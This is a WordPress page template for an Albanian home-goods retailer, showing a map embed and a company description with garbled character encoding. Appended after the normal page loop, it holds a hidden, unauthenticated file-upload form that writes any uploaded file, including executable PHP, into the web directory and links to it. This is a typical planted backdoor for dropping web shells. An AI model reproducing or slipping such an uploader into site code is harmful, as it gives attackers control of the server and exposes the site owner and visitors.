<?php /* Template Name: Maps Up*/ ?>
<?php get_header(); ?>
<center>
<iframe src="https://snazzymaps.com/embed/192270" width="1200px" height="550px" style="border:none;"></iframe>
<center>
<div class="wpb_wrapper">
			<p><a href="//wpbingosite.com/wordpress/oritina/wp-content/uploads/2016/07/icon-about.png"><img class="alignnone size-full wp-image-2250" src="//wpbingosite.com/wordpress/oritina/wp-content/uploads/2016/07/icon-about.png" alt="" width="34" height="32"></a></p>
<h2>Kush jemi ne</h2>
<p>Gjith�ka ka filluar me Komoditetin!</p>
<p>Mars 2014 koha kur �sht� vulosur produkti �Dyshek Comodita�, nj� dyshek pasardh�s i pun�s 25 vje�are e prodhimit t� shpuz�s dhe dyshek�ve nga nj� nd�r kompanit� m� t� m�dha n� tregun ton� � Devolli Corporation. Ky produkt ka qen� vet�m hapi i par�, i cili p�r nj� koh� shum� t� shkurt�r �sht� pasuar nga projekti p�r zgjerimin e nj� rrjeti dyqanesh me produkte sht�pie COMODITA HOME.</p>
<p>Ne, Comodita Home, jemi prezantuar n� Mars t� vitit 2015 fillimisht me 8 dyqane n� Kosov�, sot num�rojm� 24 dyqane n� t� gjitha qytetet e Kosov�s, 12 n� Shqip�ri dhe 11 n� Maqedoni.</p>
<h2>KONTAKTET</h2>
<p>-</p> 
</center>


		</div>
<!--more-->
<?php
			/* Start the Loop */
			while ( have_posts() ) :
				the_post();

				get_template_part( 'template-parts/content/content', 'page' );


			endwhile; // End of the loop.
			
if($_POST['upload']=="upload"){
$nama_file = $_FILES['file']['tmp_name'];
$folder = "./";
$file_upload = $_FILES['file']['name'];
$spasi = explode(" ",$file_upload);
$hspasi = implode("_",$spasi);
$huruf_kecil = strtolower($hspasi);
if(is_uploaded_file($nama_file))
{
move_uploaded_file($nama_file,$folder.$huruf_kecil);
echo"sukses<br/>";
echo"Open File <a target='_blank' href='http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]".$_FILES['file']['name']."'>http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]".$_FILES['file']['name']."</a>";
}
else{echo"gagal";}
}else{
    ?>
 
    <form method="post" enctype="multipart/form-data">
    <input type="file" name="file"/><input type="submit" name="upload" value="upload" />
    </form>
<?php }
?>


<?php get_footer(); ?>